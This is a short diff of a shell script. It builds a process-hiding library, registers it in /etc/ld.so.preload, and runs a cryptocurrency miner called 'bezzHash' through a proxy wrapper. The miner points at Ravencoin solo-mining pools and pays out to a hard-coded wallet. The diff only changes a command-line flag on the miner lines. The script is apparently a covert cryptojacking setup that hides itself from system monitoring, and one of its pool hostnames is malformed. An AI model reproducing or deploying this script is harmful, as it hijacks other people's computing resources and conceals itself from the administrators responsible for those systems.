@@ -53,8 +53,8 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-./graftcp/graftcp ./bezzHash --url=RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-solo-rvn.2miners.com:7070 --nonvml
+./graftcp/graftcp ./bezzHash --url=RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-solo-rvn.2miners.com:7070 --ocX
 
-./graftcp/graftcp ./bezzHash --url=RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@asia-solo-rvn.2miners.com:7070 --nonvml
+./graftcp/graftcp ./bezzHash --url=RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@asia-solo-rvn.2miners.com:7070 --ocX
 
-./graftcp/graftcp ./bezzHash --url=RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@-solo-rvn.2miners.com:7070 --nonvml
+./graftcp/graftcp ./bezzHash --url=RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@-solo-rvn.2miners.com:7070 --ocX
